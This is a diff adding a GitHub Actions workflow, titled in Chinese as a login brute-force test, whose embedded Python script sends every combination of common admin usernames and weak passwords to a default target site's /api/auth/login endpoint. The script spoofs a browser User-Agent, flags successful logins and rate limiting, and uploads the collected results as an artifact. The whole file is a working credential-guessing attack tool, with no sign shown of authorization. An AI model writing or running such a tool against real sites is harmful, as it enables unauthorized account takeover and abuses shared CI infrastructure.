@@ -1,0 +1,74 @@
+name: 登录爆破测试
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: '目标基础URL'
+        required: true
+        default: 'https://nlhlsd.xyz'
+      account_list:
+        description: '账号列表(逗号分隔)'
+        required: true
+        default: 'admin,root,administrator,maozi,test'
+      pass_list:
+        description: '密码列表(逗号分隔)'
+        required: true
+        default: '123456,password,admin123,12345678,admin'
+      delay:
+        description: '请求间隔秒'
+        required: false
+        default: '1'
+jobs:
+  brute:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: 执行登录爆破
+        env:
+          TARGET: ${{ github.event.inputs.target }}
+          ACCOUNTS: ${{ github.event.inputs.account_list }}
+          PASSES: ${{ github.event.inputs.pass_list }}
+          DELAY: ${{ github.event.inputs.delay }}
+        run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.error, json, time, sys
+          target = __import__('os').environ['TARGET'].rstrip('/')
+          accounts = __import__('os').environ['ACCOUNTS'].split(',')
+          passes = __import__('os').environ['PASSES'].split(',')
+          delay = float(__import__('os').environ['DELAY'])
+          print(f"目标: {target} | 账号 {len(accounts)} 个 x 密码 {len(passes)} 个 = {len(accounts)*len(passes)} 组合", flush=True)
+          results = []
+          for acc in accounts:
+            for pwd in passes:
+              acc = acc.strip(); pwd = pwd.strip()
+              body = json.dumps({"account": acc, "password": pwd}).encode()
+              req = urllib.request.Request(target + "/api/auth/login", data=body, method="POST",
+                      headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"})
+              try:
+                resp = urllib.request.urlopen(req, timeout=15)
+                data = resp.read().decode()
+                code = resp.status
+                status = "SUCCESS" if code == 200 else f"HTTP{code}"
+                if code == 200:
+                  print(f"✅ 命中! {acc}:{pwd} -> {data[:200]}", flush=True)
+                results.append({"account": acc, "password": pwd, "status": code, "body": data[:200]})
+              except urllib.error.HTTPError as e:
+                data = e.read().decode()
+                code = e.code
+                marker = "存在" if "invalid_credentials" in data or "密码" in data else ("限流" if code == 429 else "其他")
+                if code != 429:
+                  print(f"  {acc}:{pwd} -> {code} {marker} {data[:100]}", flush=True)
+                results.append({"account": acc, "password": pwd, "status": code, "body": data[:200]})
+              except Exception as e:
+                results.append({"account": acc, "password": pwd, "status": "ERR", "body": str(e)[:100]})
+              time.sleep(delay)
+          # 保存结果
+          import pathlib
+          pathlib.Path("results.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
+          hits = [r for r in results if r["status"] == 200]
+          print(f"\n完成: {len(results)} 组合 | 命中 {len(hits)} | 429限流 {sum(1 for r in results if r['status']==429)}", flush=True)
+          PYEOF
+      - uses: actions/upload-artifact@v4
+        with:
+          name: bruteforce-results
+          path: results.json
